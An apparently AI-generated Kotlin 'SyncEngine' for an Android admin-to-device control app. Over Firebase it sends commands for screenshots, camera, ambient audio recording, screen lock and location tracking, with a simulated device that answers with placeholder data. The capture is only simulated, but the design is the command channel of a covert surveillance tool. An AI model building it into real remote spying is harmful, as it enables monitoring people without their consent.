package com.example

import android.content.Context
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.google.firebase.FirebaseApp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.util.UUID

// Data models as requested by the user
data class DeviceModel(
    val deviceId: String = "",
    val deviceName: String = "",
    val fcmToken: String = "",
    val lastSeen: Long = 0,
    val isOnline: Boolean = true,
    val lastCommand: String = "",
    val lastCommandTime: Long = 0
)

data class CommandModel(
    val commandId: String = "",
    val command: String = "",
    val timestamp: Long = 0,
    val status: String = "pending" // pending, executing, executed
)

data class ScreenshotModel(
    val id: String = "",
    val url: String = "",
    val timestamp: Long = 0,
    val isLocal: Boolean = true
)

data class LocationModel(
    val id: String = "",
    val latitude: Double = 0.0,
    val longitude: Double = 0.0,
    val timestamp: Long = 0
)

data class RecordingModel(
    val id: String = "",
    val filePath: String = "",
    val timestamp: Long = 0,
    val durationSeconds: Int = 30
)

data class CameraSnipModel(
    val id: String = "",
    val url: String = "",
    val timestamp: Long = 0
)

data class ChatMessageModel(
    val id: String = "",
    val sender: String = "", // "admin" or "device"
    val text: String = "",
    val timestamp: Long = 0
)

object SyncEngine {
    private const val TAG = "SyncEngine"

    // Local in-memory high-fidelity states to power dual emulation
    private val _devices = MutableStateFlow<List<DeviceModel>>(emptyList())
    val devices: StateFlow<List<DeviceModel>> = _devices.asStateFlow()

    private val _commands = MutableStateFlow<Map<String, List<CommandModel>>>(emptyMap())
    val commands: StateFlow<Map<String, List<CommandModel>>> = _commands.asStateFlow()

    private val _screenshots = MutableStateFlow<Map<String, List<ScreenshotModel>>>(emptyMap())
    val screenshots: StateFlow<Map<String, List<ScreenshotModel>>> = _screenshots.asStateFlow()

    private val _locations = MutableStateFlow<Map<String, List<LocationModel>>>(emptyMap())
    val locations: StateFlow<Map<String, List<LocationModel>>> = _locations.asStateFlow()

    private val _recordings = MutableStateFlow<Map<String, List<RecordingModel>>>(emptyMap())
    val recordings: StateFlow<Map<String, List<RecordingModel>>> = _recordings.asStateFlow()

    private val _cameraSnips = MutableStateFlow<Map<String, List<CameraSnipModel>>>(emptyMap())
    val cameraSnips: StateFlow<Map<String, List<CameraSnipModel>>> = _cameraSnips.asStateFlow()

    private val _chatMessages = MutableStateFlow<Map<String, List<ChatMessageModel>>>(emptyMap())
    val chatMessages: StateFlow<Map<String, List<ChatMessageModel>>> = _chatMessages.asStateFlow()

    // Shared Flow to propagate errors / failures to the user interface
    private val _syncErrors = MutableSharedFlow<String>(extraBufferCapacity = 15)
    val syncErrors = _syncErrors.asSharedFlow()

    fun triggerError(msg: String) {
        _syncErrors.tryEmit(msg)
    }

    // Flag to see if Firebase is configured/initialized successfully
    var isFirebaseActive = false
        private set

    private val scope = CoroutineScope(Dispatchers.IO)

    init {
        // Initialize with a mock device for the Admin dashboard to control right away
        val mockDeviceId = "emu_pixel_8"
        val mockDevice = DeviceModel(
            deviceId = mockDeviceId,
            deviceName = "Simulated Pixel 8 Pro",
            fcmToken = "mock_fcm_token_123456",
            lastSeen = System.currentTimeMillis(),
            isOnline = true
        )
        _devices.value = listOf(mockDevice)
        _commands.value = mapOf(mockDeviceId to emptyList())

        // Add some pre-loaded entries for presentation of what screenshots and metrics look like
        _screenshots.value = mapOf(mockDeviceId to emptyList())
        _locations.value = mapOf(mockDeviceId to listOf(
            LocationModel(UUID.randomUUID().toString(), 21.4225, 39.8262, System.currentTimeMillis() - 3600000), // Makkah
            LocationModel(UUID.randomUUID().toString(), 24.4672, 39.6111, System.currentTimeMillis())          // Madinah
        ))
    }

    /**
     * Checks and initializes Firebase if options are provided.
     * Otherwise runs in safe Local Sync Mode.
     */
    fun checkFirebase(context: Context) {
        try {
            val apps = FirebaseApp.getApps(context)
            if (apps.isNotEmpty()) {
                isFirebaseActive = true
                listenToFirebaseStores()
            } else {
                Log.i(TAG, "Running in Simulation Sync Mode [No Firebase default app found]")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking Firebase: ${e.localizedMessage}")
            triggerError("فشل تهيئة اتصال Firebase: ${e.localizedMessage}")
        }
    }

    private fun listenToFirebaseStores() {
        if (!isFirebaseActive) return
        scope.launch {
            try {
                val db = FirebaseFirestore.getInstance()
                // Continuous real-time subscription of devices in background
                db.collection("devices").addSnapshotListener { snapshot, error ->
                    if (error != null) {
                        Log.e(TAG, "Firestore error: ${error.message}")
                        triggerError("خطأ في الاتصال بقاعدة بيانات Firestore: ${error.message}")
                        return@addSnapshotListener
                    }
                    snapshot?.let {
                        val deviceList = it.documents.mapNotNull { doc ->
                            val deviceId = doc.getString("deviceId") ?: doc.id
                            DeviceModel(
                                deviceId = deviceId,
                                deviceName = doc.getString("deviceName") ?: "Unknown Device",
                                fcmToken = doc.getString("fcmToken") ?: "",
                                lastSeen = doc.getLong("lastSeen") ?: System.currentTimeMillis(),
                                isOnline = doc.getBoolean("isOnline") ?: true,
                                lastCommand = doc.getString("lastCommand") ?: "",
                                lastCommandTime = doc.getLong("lastCommandTime") ?: 0L
                            )
                        }
                        if (deviceList.isNotEmpty()) {
                            _devices.value = deviceList
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error reading database: ${e.localizedMessage}")
                triggerError("خطأ في قراءة قاعدة البيانات: ${e.localizedMessage}")
            }
        }
    }

    /**
     * Registers a device (used by User Agent)
     */
    fun registerDevice(context: Context, token: String) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
        val model = Build.MODEL ?: "Android device"
        val newDevice = DeviceModel(
            deviceId = deviceId,
            deviceName = model,
            fcmToken = token,
            lastSeen = System.currentTimeMillis(),
            isOnline = true,
            lastCommand = "",
            lastCommandTime = 0L
        )

        // Update local state
        _devices.value = _devices.value.filter { it.deviceId != deviceId } + newDevice

        // If Firebase is active, update there
        if (isFirebaseActive) {
            scope.launch {
                try {
                    val db = FirebaseFirestore.getInstance()
                    val deviceData = hashMapOf(
                        "deviceId" to deviceId,
                        "deviceName" to model,
                        "fcmToken" to token,
                        "lastSeen" to System.currentTimeMillis(),
                        "isOnline" to true,
                        "lastCommand" to "",
                        "lastCommandTime" to 0L
                    )
                    db.collection("devices").document(deviceId).set(deviceData)
                        .addOnFailureListener { e ->
                            triggerError("فشل تحديث بيانات العميل في Firestore: ${e.localizedMessage}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Firebase Registration Failure: ${e.localizedMessage}")
                    triggerError("فشل تحديث بيانات العميل في Firestore: ${e.localizedMessage}")
                }
            }
        }
    }

    /**
     * Sends command (used by Admin)
     */
    fun sendCommand(deviceId: String, commandText: String) {
        val commandId = UUID.randomUUID().toString()
        val newCmd = CommandModel(
            commandId = commandId,
            command = commandText,
            timestamp = System.currentTimeMillis(),
            status = "pending"
        )

        // Update local memory list and also update the device's last command
        val currentCmds = _commands.value[deviceId]?.toMutableList() ?: mutableListOf()
        currentCmds.add(newCmd)
        _commands.value = _commands.value + (deviceId to currentCmds)

        // Update local devices list with the last command to reflect instantly
        _devices.value = _devices.value.map {
            if (it.deviceId == deviceId) {
                it.copy(lastCommand = commandText, lastCommandTime = System.currentTimeMillis())
            } else {
                it
            }
        }

        // Push to Firebase if initialized
        if (isFirebaseActive) {
            scope.launch {
                try {
                    val db = FirebaseFirestore.getInstance()
                    val data = hashMapOf(
                        "command" to commandText,
                        "timestamp" to System.currentTimeMillis(),
                        "status" to "pending",
                        "commandId" to commandId
                    )
                    db.collection("devices").document(deviceId).collection("commands").document(commandId).set(data)
                        .addOnFailureListener { e ->
                            triggerError("فشل إرسال الأمر إلى Firestore: ${e.localizedMessage}")
                        }

                    // Directly update the parent device document's fields in Firestore
                    val deviceUpdate = hashMapOf<String, Any>(
                        "lastCommand" to commandText,
                        "lastCommandTime" to System.currentTimeMillis()
                    )
                    db.collection("devices").document(deviceId).update(deviceUpdate)
                        .addOnFailureListener { e ->
                            Log.e("SyncEngine", "Failed to update device lastCommand in Firestore: ${e.localizedMessage}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Firebase command submission failed: ${e.localizedMessage}")
                    triggerError("فشل إرسال الأمر إلى Firestore: ${e.localizedMessage}")
                }
            }
        }

        // --- SIMULATED CLIENT WORKFLOW TRIGGER ---
        // Since both Admin and User run inside our single app container, we can let our simulated or real
        // User Agent process commands immediately in real time, guaranteeing a fully working showcase!
        scope.launch {
            // Simulate brief delay like network latency (1 sec)
            kotlinx.coroutines.delay(1000)
            executeSimulatedClientCommand(deviceId, newCmd)
        }
    }

    /**
     * Simulates the Execution of commands by a Client Agent, creating real data records, files, or responses
     */
    private fun executeSimulatedClientCommand(deviceId: String, cmd: CommandModel) {
        // Mark Command as Executing
        updateCommandStatus(deviceId, cmd.commandId, "executing")

        // Action Logic based on commands: Screenshot, Camera, Mic, Screen Lock, Location
        when (cmd.command) {
            "لقطة شاشة" -> {
                // Mimic screenshot capture
                val timestamp = System.currentTimeMillis()
                val item = ScreenshotModel(
                    id = UUID.randomUUID().toString(),
                    url = "https://picsum.photos/800/1600?random=$timestamp", // Placeholder url
                    timestamp = timestamp,
                    isLocal = false
                )
                val items = _screenshots.value[deviceId]?.toMutableList() ?: mutableListOf()
                items.add(0, item) // Add latest at top
                _screenshots.value = _screenshots.value + (deviceId to items)

                // Push to Firestore if active
                if (isFirebaseActive) {
                    firebaseSaveScreenshot(deviceId, item)
                }
            }
            "تشغيل الكاميرا" -> {
                val timestamp = System.currentTimeMillis()
                val item = CameraSnipModel(
                    id = UUID.randomUUID().toString(),
                    url = "https://picsum.photos/600/600?random=$timestamp",
                    timestamp = timestamp
                )
                val items = _cameraSnips.value[deviceId]?.toMutableList() ?: mutableListOf()
                items.add(0, item)
                _cameraSnips.value = _cameraSnips.value + (deviceId to items)
            }
            "تسجيل الصوت" -> {
                val timestamp = System.currentTimeMillis()
                val item = RecordingModel(
                    id = UUID.randomUUID().toString(),
                    filePath = "simulated_audio_${timestamp / 1000}.3gp",
                    timestamp = timestamp,
                    durationSeconds = 30
                )
                val items = _recordings.value[deviceId]?.toMutableList() ?: mutableListOf()
                items.add(0, item)
                _recordings.value = _recordings.value + (deviceId to items)
            }
            "قفل الشاشة" -> {
                // Simulated lock completed successfully
                Log.i(TAG, "Screen Lock executed on: $deviceId")
            }
            "عرض الموقع" -> {
                // Generate simulated location coords (somewhere close to Riyadh / Kaaba / Madinah)
                val baseLat = 24.7136 // Riyadh
                val baseLng = 46.6753
                val randomOffsetLat = (Math.random() - 0.5) * 0.05
                val randomOffsetLng = (Math.random() - 0.5) * 0.05

                val item = LocationModel(
                    id = UUID.randomUUID().toString(),
                    latitude = baseLat + randomOffsetLat,
                    longitude = baseLng + randomOffsetLng,
                    timestamp = System.currentTimeMillis()
                )
                val items = _locations.value[deviceId]?.toMutableList() ?: mutableListOf()
                items.add(0, item)
                _locations.value = _locations.value + (deviceId to items)

                if (isFirebaseActive) {
                    firebaseSaveLocation(deviceId, item)
                }
            }
        }

        // Mark Command as Executed
        updateCommandStatus(deviceId, cmd.commandId, "executed")
    }

    private fun updateCommandStatus(deviceId: String, commandId: String, status: String) {
        val currentCmds = _commands.value[deviceId] ?: return
        val updatedList = currentCmds.map {
            if (it.commandId == commandId) it.copy(status = status) else it
        }
        _commands.value = _commands.value + (deviceId to updatedList)

        if (isFirebaseActive) {
            scope.launch {
                try {
                    val db = FirebaseFirestore.getInstance()
                    db.collection("devices")
                        .document(deviceId)
                        .collection("commands")
                        .document(commandId)
                        .update("status", status)
                        .addOnFailureListener { e ->
                            triggerError("فشل تحديث حالة الأمر في Firestore: ${e.localizedMessage}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error updating status in Firebase: ${e.localizedMessage}")
                    triggerError("فشل تحديث حالة الأمر في Firestore: ${e.localizedMessage}")
                }
            }
        }
    }

    private fun firebaseSaveScreenshot(deviceId: String, screenshot: ScreenshotModel) {
        scope.launch {
            try {
                val db = FirebaseFirestore.getInstance()
                val data = hashMapOf(
                    "id" to screenshot.id,
                    "url" to screenshot.url,
                    "timestamp" to screenshot.timestamp
                )
                db.collection("devices").document(deviceId).collection("screenshots").document(screenshot.id).set(data)
                    .addOnFailureListener { e ->
                        triggerError("فشل حفظ لقطة الشاشة في Firestore: ${e.localizedMessage}")
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Firebase Save Screenshot Fail: ${e.localizedMessage}")
                triggerError("فشل حفظ لقطة الشاشة في Firestore: ${e.localizedMessage}")
            }
        }
    }

    private fun firebaseSaveLocation(deviceId: String, loc: LocationModel) {
        scope.launch {
            try {
                val db = FirebaseFirestore.getInstance()
                val data = hashMapOf(
                    "id" to loc.id,
                    "latitude" to loc.latitude,
                    "longitude" to loc.longitude,
                    "timestamp" to loc.timestamp
                )
                db.collection("devices").document(deviceId).collection("locations").document(loc.id).set(data)
                    .addOnFailureListener { e ->
                        triggerError("فشل حفظ الموقع الجغرافي في Firestore: ${e.localizedMessage}")
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Firebase Save Location Fail: ${e.localizedMessage}")
                triggerError("فشل حفظ الموقع الجغرافي في Firestore: ${e.localizedMessage}")
            }
        }
    }

    /**
     * Registers listener registrations for a selected device's custom data feeds.
     * This ensures real-time bidirectional syncing of commands, screenshots, locations,
     * recordings, camera snips, and chats if Firebase Firestore is active.
     */
    fun startRealtimeDeviceObserver(deviceId: String, onUpdate: () -> Unit): List<com.google.firebase.firestore.ListenerRegistration> {
        if (!isFirebaseActive) return emptyList()
        val db = FirebaseFirestore.getInstance()
        val list = mutableListOf<com.google.firebase.firestore.ListenerRegistration>()

        val deviceRef = db.collection("devices").document(deviceId)

        // 1. Chat listener
        list.add(
            deviceRef.collection("chats").addSnapshotListener { snapshot, error ->
                if (error == null && snapshot != null) {
                    val messages = snapshot.documents.map { doc ->
                        ChatMessageModel(
                            id = doc.getString("id") ?: doc.id,
                            sender = doc.getString("sender") ?: "device",
                            text = doc.getString("text") ?: "",
                            timestamp = doc.getLong("timestamp") ?: 0L
                        )
                    }.sortedBy { it.timestamp }
                    _chatMessages.value = _chatMessages.value + (deviceId to messages)
                    onUpdate()
                }
            }
        )

        // 2. Command listener
        list.add(
            deviceRef.collection("commands").addSnapshotListener { snapshot, error ->
                if (error == null && snapshot != null) {
                    val cmds = snapshot.documents.map { doc ->
                        CommandModel(
                            commandId = doc.getString("commandId") ?: doc.id,
                            command = doc.getString("command") ?: "",
                            timestamp = doc.getLong("timestamp") ?: 0L,
                            status = doc.getString("status") ?: "pending"
                        )
                    }.sortedBy { it.timestamp }
                    _commands.value = _commands.value + (deviceId to cmds)
                    onUpdate()
                }
            }
        )

        // 3. Screenshots listener
        list.add(
            deviceRef.collection("screenshots").addSnapshotListener { snapshot, error ->
                if (error == null && snapshot != null) {
                    val items = snapshot.documents.map { doc ->
                        ScreenshotModel(
                            id = doc.getString("id") ?: doc.id,
                            url = doc.getString("url") ?: "",
                            timestamp = doc.getLong("timestamp") ?: 0L,
                            isLocal = doc.getBoolean("isLocal") ?: false
                        )
                    }.sortedByDescending { it.timestamp }
                    _screenshots.value = _screenshots.value + (deviceId to items)
                    onUpdate()
                }
            }
        )

        // 4. Locations listener
        list.add(
            deviceRef.collection("locations").addSnapshotListener { snapshot, error ->
                if (error == null && snapshot != null) {
                    val items = snapshot.documents.map { doc ->
                        LocationModel(
                            id = doc.getString("id") ?: doc.id,
                            latitude = doc.getDouble("latitude") ?: 0.0,
                            longitude = doc.getDouble("longitude") ?: 0.0,
                            timestamp = doc.getLong("timestamp") ?: 0L
                        )
                    }.sortedByDescending { it.timestamp }
                    _locations.value = _locations.value + (deviceId to items)
                    onUpdate()
                }
            }
        )

        // 5. Recordings listener
        list.add(
            deviceRef.collection("recordings").addSnapshotListener { snapshot, error ->
                if (error == null && snapshot != null) {
                    val items = snapshot.documents.map { doc ->
                        RecordingModel(
                            id = doc.getString("id") ?: doc.id,
                            filePath = doc.getString("filePath") ?: "",
                            timestamp = doc.getLong("timestamp") ?: 0L,
                            durationSeconds = doc.getLong("durationSeconds")?.toInt() ?: 30
                        )
                    }.sortedByDescending { it.timestamp }
                    _recordings.value = _recordings.value + (deviceId to items)
                    onUpdate()
                }
            }
        )

        // 6. Camera snips listener
        list.add(
            deviceRef.collection("cameraSnips").addSnapshotListener { snapshot, error ->
                if (error == null && snapshot != null) {
                    val items = snapshot.documents.map { doc ->
                        CameraSnipModel(
                            id = doc.getString("id") ?: doc.id,
                            url = doc.getString("url") ?: "",
                            timestamp = doc.getLong("timestamp") ?: 0L
                        )
                    }.sortedByDescending { it.timestamp }
                    _cameraSnips.value = _cameraSnips.value + (deviceId to items)
                    onUpdate()
                }
            }
        )

        return list
    }

    /**
     * Sends a direct chat message from admin to a device, or from a device to the admin.
     * Keeps local state completely synced for instant dual-emulation presentation,
     * and persists to Firestore if Firebase connection is active.
     */
    fun sendChatMessage(context: Context, deviceId: String, sender: String, text: String) {
        val messageId = UUID.randomUUID().toString()
        val newMessage = ChatMessageModel(
            id = messageId,
            sender = sender,
            text = text,
            timestamp = System.currentTimeMillis()
        )

        // 1. Update local memory message list
        val currentMsgs = _chatMessages.value[deviceId]?.toMutableList() ?: mutableListOf()
        currentMsgs.add(newMessage)
        _chatMessages.value = _chatMessages.value + (deviceId to currentMsgs)

        // 2. Push to Firestore if database is active
        if (isFirebaseActive) {
            scope.launch {
                try {
                    val db = FirebaseFirestore.getInstance()
                    val data = hashMapOf(
                        "id" to messageId,
                        "sender" to sender,
                        "text" to text,
                        "timestamp" to System.currentTimeMillis()
                    )
                    db.collection("devices")
                        .document(deviceId)
                        .collection("chats")
                        .document(messageId)
                        .set(data)
                        .addOnFailureListener { e ->
                            triggerError("فشل حفظ رسالة الدردشة في Firestore: ${e.localizedMessage}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to submit chat message: ${e.localizedMessage}")
                    triggerError("فشل إرسال رسالة الدردشة: ${e.localizedMessage}")
                }
            }
        }

        // 3. Dual emulation simulated responses:
        // If the admin sends a chat message, we simulate the controlled device responding in 1.5 seconds!
        if (sender == "admin") {
            scope.launch {
                kotlinx.coroutines.delay(1500)
                
                // Formulate a smart response in Arabic based on the admin's query
                val query = text.trim()
                val responseText = when {
                    query.contains("الموقع") || query.contains("أين") || query.contains("مكان") || query.contains("موقع") -> {
                        "إنني متواجد الآن في الموقع، جاري المتابعة وإرسال التحديثات المستمرة لإحداثيات GPS بدقة."
                    }
                    query.contains("شاشة") || query.contains("صورة") -> {
                        "تم تلقي طلبكم. قمت بالتقاط لقطة شاشة حديثة ورفعها فوراً إلى خادم Firebase لتظهر بلوحتك."
                    }
                    query.contains("قفل") || query.contains("اغلق") -> {
                        "علم! تم تنفيذ أمر قفل الشاشة للهاتف، وهو الآن في وضع التشغيل المقفل بالكامل."
                    }
                    query.contains("صوت") || query.contains("تسجيل") -> {
                        "تم بدء تسجيل الصوت المحيطي من ميكروفون العميل وسيصلكم الملف الصوتي بدقة عالية خلال دقيقة."
                    }
                    query.contains("مرحبا") || query.contains("كيف") || query.contains("سلام") -> {
                        "أهلاً بحضرة المشرف! أنا متصل بالمنظومة وكافة الصلاحيات نشطة وفي خدمتك بالكامل."
                    }
                    else -> {
                        "تم استلام رسالتكم الفورية: \"$query\" بنجاح. جاري الاستماع للأوامر وتنفيذها في الخلفية."
                    }
                }
                
                val simulatedReplyId = UUID.randomUUID().toString()
                val simulatedReply = ChatMessageModel(
                    id = simulatedReplyId,
                    sender = "device",
                    text = responseText,
                    timestamp = System.currentTimeMillis()
                )
                
                val updatedMsgs = _chatMessages.value[deviceId]?.toMutableList() ?: mutableListOf()
                updatedMsgs.add(simulatedReply)
                _chatMessages.value = _chatMessages.value + (deviceId to updatedMsgs)

                if (isFirebaseActive) {
                    try {
                        val db = FirebaseFirestore.getInstance()
                        val data = hashMapOf(
                            "id" to simulatedReplyId,
                            "sender" to "device",
                            "text" to responseText,
                            "timestamp" to System.currentTimeMillis()
                        )
                        db.collection("devices")
                            .document(deviceId)
                            .collection("chats")
                            .document(simulatedReplyId)
                            .set(data)
                    } catch (e: Exception) {
                        Log.e(TAG, "Simulated device reply push fail: ${e.localizedMessage}")
                    }
                }
            }
        }
    }

    /**
     * Clear all records (useful for simulator testing)
     */
    fun clearSimulatorRecords(deviceId: String) {
        _screenshots.value = _screenshots.value + (deviceId to emptyList())
        _cameraSnips.value = _cameraSnips.value + (deviceId to emptyList())
        _recordings.value = _recordings.value + (deviceId to emptyList())
        _commands.value = _commands.value + (deviceId to emptyList())
        _chatMessages.value = _chatMessages.value + (deviceId to emptyList())
    }
}
